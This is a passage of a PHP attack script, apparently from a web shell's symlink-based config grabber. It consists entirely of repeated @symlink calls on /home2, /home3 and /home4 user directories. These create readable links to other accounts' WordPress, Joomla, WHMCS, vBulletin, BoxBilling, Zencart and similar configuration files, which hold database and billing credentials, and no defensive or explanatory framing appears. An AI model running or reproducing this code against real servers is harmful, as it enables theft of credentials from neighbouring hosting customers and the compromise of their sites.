@symlink('/home2/'.$user.'/public_html/hosting/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/CART/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/Cart/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/cart/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/ORDER/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/Order/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/order/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/CLIENT/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/Client/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/client/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/CLIENTAREA/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/Clientarea/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/clientarea/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/SUPPORT/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/Support/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/support/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/BILLING/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/Billing/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/billing/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/BUY/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/Buy/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/buy/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/MANAGE/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/Manage/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/manage/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/CLIENTSUPPORT/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/ClientSupport/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/Clientsupport/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/clientsupport/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/CHECKOUT/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/Checkout/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/checkout/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/BILLINGS/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/Billings/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/billings/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/BASKET/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/Basket/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/basket/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/SECURE/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/Secure/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/secure/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/SALES/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/Sales/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/sales/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/BILL/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/Bill/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/bill/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/PURCHASE/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/Purchase/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/purchase/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/ACCOUNT/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/Account/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/account/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/USER/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/User/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/user/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/CLIENTS/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/Clients/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/clients/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/BILLINGS/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/Billings/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/billings/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/MY/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/My/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/my/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/secure/whm/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/secure/whmcs/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/panel/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/clientes/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/cliente/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/support/order/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home2/'.$user.'/public_html/boxbilling/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home2/'.$user.'/public_html/box/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home2/'.$user.'/public_html/host/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home2/'.$user.'/public_html/Host/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home2/'.$user.'/public_html/supportes/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home2/'.$user.'/public_html/support/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home2/'.$user.'/public_html/hosting/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home2/'.$user.'/public_html/cart/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home2/'.$user.'/public_html/order/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home2/'.$user.'/public_html/client/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home2/'.$user.'/public_html/clients/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home2/'.$user.'/public_html/cliente/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home2/'.$user.'/public_html/clientes/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home2/'.$user.'/public_html/billing/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home2/'.$user.'/public_html/billings/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home2/'.$user.'/public_html/my/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home2/'.$user.'/public_html/secure/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home2/'.$user.'/public_html/support/order/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home2/'.$user.'/public_html/includes/dist-configure.php',$user.'-Zencart.txt');
@symlink('/home2/'.$user.'/public_html/zencart/includes/dist-configure.php',$user.'-Zencart.txt');
@symlink('/home2/'.$user.'/public_html/products/includes/dist-configure.php',$user.'-Zencart.txt');
@symlink('/home2/'.$user.'/public_html/cart/includes/dist-configure.php',$user.'-Zencart.txt');
@symlink('/home2/'.$user.'/public_html/shop/includes/dist-configure.php',$user.'-Zencart.txt');
@symlink('/home2/'.$user.'/public_html/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home2/'.$user.'/public_html/hostbills/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home2/'.$user.'/public_html/host/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home2/'.$user.'/public_html/Host/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home2/'.$user.'/public_html/supportes/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home2/'.$user.'/public_html/support/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home2/'.$user.'/public_html/hosting/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home2/'.$user.'/public_html/cart/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home2/'.$user.'/public_html/order/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home2/'.$user.'/public_html/client/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home2/'.$user.'/public_html/clients/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home2/'.$user.'/public_html/cliente/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home2/'.$user.'/public_html/clientes/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home2/'.$user.'/public_html/billing/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home2/'.$user.'/public_html/billings/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home2/'.$user.'/public_html/my/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home2/'.$user.'/public_html/secure/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home2/'.$user.'/public_html/support/order/includes/iso4217.php',$user.'-Hostbills.txt');

//Home3

@symlink('/home3/'.$user.'/public_html/vb/includes/config.php',$user.'-Vbulletin.txt');
@symlink('/home3/'.$user.'/public_html/includes/config.php',$user.'-Vbulletin.txt');
@symlink('/home3/'.$user.'/public_html/forum/includes/config.php',$user.'-Vbulletin.txt');
@symlink('/home3/'.$user.'/public_html/forums/includes/config.php',$user.'-Vbulletin.txt');
@symlink('/home3/'.$user.'/public_html/cc/includes/config.php',$user.'-Vbulletin.txt');
@symlink('/home3/'.$user.'/public_html/inc/config.php',$user.'-MyBB.txt');
@symlink('/home3/'.$user.'/public_html/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home3/'.$user.'/public_html/shop/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home3/'.$user.'/public_html/os/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home3/'.$user.'/public_html/oscom/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home3/'.$user.'/public_html/products/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home3/'.$user.'/public_html/cart/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home3/'.$user.'/public_html/inc/conf_global.php',$user.'-IPB.txt');
@symlink('/home3/'.$user.'/public_html/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home3/'.$user.'/public_html/wp/test/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home3/'.$user.'/public_html/blog/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home3/'.$user.'/public_html/beta/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home3/'.$user.'/public_html/portal/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home3/'.$user.'/public_html/site/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home3/'.$user.'/public_html/wp/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home3/'.$user.'/public_html/WP/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home3/'.$user.'/public_html/news/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home3/'.$user.'/public_html/wordpress/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home3/'.$user.'/public_html/test/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home3/'.$user.'/public_html/demo/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home3/'.$user.'/public_html/home/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home3/'.$user.'/public_html/v1/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home3/'.$user.'/public_html/v2/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home3/'.$user.'/public_html/press/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home3/'.$user.'/public_html/new/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home3/'.$user.'/public_html/blogs/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home3/'.$user.'/public_html/configuration.php',$user.'-Joomla.txt');
@symlink('/home3/'.$user.'/public_html/blog/configuration.php',$user.'-Joomla.txt');
@symlink('/home3/'.$user.'/public_html/submitticket.php',$user.'-^WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/cms/configuration.php',$user.'-Joomla.txt');
@symlink('/home3/'.$user.'/public_html/beta/configuration.php',$user.'-Joomla.txt');
@symlink('/home3/'.$user.'/public_html/portal/configuration.php',$user.'-Joomla.txt');
@symlink('/home3/'.$user.'/public_html/site/configuration.php',$user.'-Joomla.txt');
@symlink('/home3/'.$user.'/public_html/main/configuration.php',$user.'-Joomla.txt');
@symlink('/home3/'.$user.'/public_html/home/configuration.php',$user.'-Joomla.txt');
@symlink('/home3/'.$user.'/public_html/demo/configuration.php',$user.'-Joomla.txt');
@symlink('/home3/'.$user.'/public_html/test/configuration.php',$user.'-Joomla.txt');
@symlink('/home3/'.$user.'/public_html/v1/configuration.php',$user.'-Joomla.txt');
@symlink('/home3/'.$user.'/public_html/v2/configuration.php',$user.'-Joomla.txt');
@symlink('/home3/'.$user.'/public_html/joomla/configuration.php',$user.'-Joomla.txt');
@symlink('/home3/'.$user.'/public_html/new/configuration.php',$user.'-Joomla.txt');
@symlink('/home3/'.$user.'/public_html/WHMCS/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/whmcs1/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/Whmcs/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/whmcs/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/whmcs/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/WHMC/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/Whmc/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/whmc/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/WHM/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/Whm/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/whm/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/HOST/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/Host/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/host/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/SUPPORTES/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/Supportes/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/supportes/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/domains/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/domain/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/Hosting/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/HOSTING/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/hosting/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/CART/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/Cart/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/cart/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/ORDER/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/Order/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/order/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/CLIENT/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/Client/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/client/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/CLIENTAREA/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/Clientarea/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/clientarea/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/SUPPORT/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/Support/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/support/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/BILLING/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/Billing/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/billing/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/BUY/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/Buy/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/buy/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/MANAGE/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/Manage/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/manage/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/CLIENTSUPPORT/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/ClientSupport/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/Clientsupport/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/clientsupport/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/CHECKOUT/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/Checkout/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/checkout/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/BILLINGS/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/Billings/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/billings/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/BASKET/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/Basket/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/basket/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/SECURE/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/Secure/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/secure/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/SALES/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/Sales/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/sales/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/BILL/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/Bill/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/bill/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/PURCHASE/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/Purchase/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/purchase/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/ACCOUNT/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/Account/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/account/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/USER/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/User/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/user/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/CLIENTS/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/Clients/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/clients/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/BILLINGS/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/Billings/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/billings/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/MY/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/My/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/my/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/secure/whm/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/secure/whmcs/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/panel/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/clientes/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/cliente/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/support/order/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home3/'.$user.'/public_html/boxbilling/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home3/'.$user.'/public_html/box/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home3/'.$user.'/public_html/host/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home3/'.$user.'/public_html/Host/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home3/'.$user.'/public_html/supportes/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home3/'.$user.'/public_html/support/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home3/'.$user.'/public_html/hosting/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home3/'.$user.'/public_html/cart/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home3/'.$user.'/public_html/order/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home3/'.$user.'/public_html/client/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home3/'.$user.'/public_html/clients/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home3/'.$user.'/public_html/cliente/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home3/'.$user.'/public_html/clientes/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home3/'.$user.'/public_html/billing/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home3/'.$user.'/public_html/billings/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home3/'.$user.'/public_html/my/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home3/'.$user.'/public_html/secure/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home3/'.$user.'/public_html/support/order/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home3/'.$user.'/public_html/includes/dist-configure.php',$user.'-Zencart.txt');
@symlink('/home3/'.$user.'/public_html/zencart/includes/dist-configure.php',$user.'-Zencart.txt');
@symlink('/home3/'.$user.'/public_html/products/includes/dist-configure.php',$user.'-Zencart.txt');
@symlink('/home3/'.$user.'/public_html/cart/includes/dist-configure.php',$user.'-Zencart.txt');
@symlink('/home3/'.$user.'/public_html/shop/includes/dist-configure.php',$user.'-Zencart.txt');
@symlink('/home3/'.$user.'/public_html/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home3/'.$user.'/public_html/hostbills/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home3/'.$user.'/public_html/host/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home3/'.$user.'/public_html/Host/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home3/'.$user.'/public_html/supportes/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home3/'.$user.'/public_html/support/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home3/'.$user.'/public_html/hosting/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home3/'.$user.'/public_html/cart/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home3/'.$user.'/public_html/order/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home3/'.$user.'/public_html/client/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home3/'.$user.'/public_html/clients/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home3/'.$user.'/public_html/cliente/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home3/'.$user.'/public_html/clientes/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home3/'.$user.'/public_html/billing/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home3/'.$user.'/public_html/billings/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home3/'.$user.'/public_html/my/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home3/'.$user.'/public_html/secure/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home3/'.$user.'/public_html/support/order/includes/iso4217.php',$user.'-Hostbills.txt');

//Home4

@symlink('/home4/'.$user.'/public_html/vb/includes/config.php',$user.'-Vbulletin.txt');
@symlink('/home4/'.$user.'/public_html/includes/config.php',$user.'-Vbulletin.txt');
@symlink('/home4/'.$user.'/public_html/forum/includes/config.php',$user.'-Vbulletin.txt');
@symlink('/home4/'.$user.'/public_html/forums/includes/config.php',$user.'-Vbulletin.txt');
@symlink('/home4/'.$user.'/public_html/cc/includes/config.php',$user.'-Vbulletin.txt');
@symlink('/home4/'.$user.'/public_html/inc/config.php',$user.'-MyBB.txt');
@symlink('/home4/'.$user.'/public_html/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home4/'.$user.'/public_html/shop/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home4/'.$user.'/public_html/os/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home4/'.$user.'/public_html/oscom/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home4/'.$user.'/public_html/products/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home4/'.$user.'/public_html/cart/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home4/'.$user.'/public_html/inc/conf_global.php',$user.'-IPB.txt');
@symlink('/home4/'.$user.'/public_html/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home4/'.$user.'/public_html/wp/test/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home4/'.$user.'/public_html/blog/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home4/'.$user.'/public_html/beta/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home4/'.$user.'/public_html/portal/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home4/'.$user.'/public_html/site/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home4/'.$user.'/public_html/wp/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home4/'.$user.'/public_html/WP/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home4/'.$user.'/public_html/news/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home4/'.$user.'/public_html/wordpress/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home4/'.$user.'/public_html/test/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home4/'.$user.'/public_html/demo/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home4/'.$user.'/public_html/home/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home4/'.$user.'/public_html/v1/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home4/'.$user.'/public_html/v2/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home4/'.$user.'/public_html/press/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home4/'.$user.'/public_html/new/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home4/'.$user.'/public_html/blogs/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home4/'.$user.'/public_html/configuration.php',$user.'-Joomla.txt');
@symlink('/home4/'.$user.'/public_html/blog/configuration.php',$user.'-Joomla.txt');
@symlink('/home4/'.$user.'/public_html/submitticket.php',$user.'-^WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/cms/configuration.php',$user.'-Joomla.txt');
@symlink('/home4/'.$user.'/public_html/beta/configuration.php',$user.'-Joomla.txt');
